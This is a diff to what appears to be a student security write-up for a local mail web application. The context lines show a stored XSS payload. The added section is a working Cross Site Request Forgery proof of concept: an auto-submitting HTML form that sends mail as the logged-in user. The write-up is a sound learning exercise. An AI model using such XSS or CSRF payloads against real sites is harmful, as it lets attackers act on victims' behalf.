@@ -34,7 +34,23 @@ Via the Object or Body field is possible to inject runnable javascript code such
 ```javascript
 <img src=x onerror="alert('Pop-up window via stored XSS');"
 ```
-
+### Cross Site Request Forgery Attack
+By analyzing the network post request and the html form was possible to craft a request and run it as a logged user on his/hers behalf.
+```html
+<html>
+   <form id="submitForm" class="form-resize" action="http://localhost:8080/ExamProject/SendMailServlet" method="post">
+      <input type="hidden" name="email" value="antonio.coppe@gmail.com"/> <input
+         type="hidden" name="password" value="null"/> <input
+         class="single-row-input" type="hidden" name="receiver"
+         placeholder="Receiver" value="antonio.coppe@gmail.com" required/> <input
+         class="single-row-input" type="hidden" name="subject"
+         placeholder="Subject" value="csrf text attack version 1" required>
+       <textarea class="textarea-input" name="body" placeholder="Body" wrap="hard"  value = "this is the body of a csef attack"required></textarea>
+       <input type="submit" name="sent" value="Send">
+   </form>
+   <script>document.getElementById("submitForm").submit()</script>
+</html>
+```
 
 ### Sniffing Attack
 With the use of a tool called ***Wireshark***(A free and open-source packet analyzer) is possible to capture *HTTP* traffic and analyze it with various tools. I will list below the step by step process for capturing the aformentioned information:
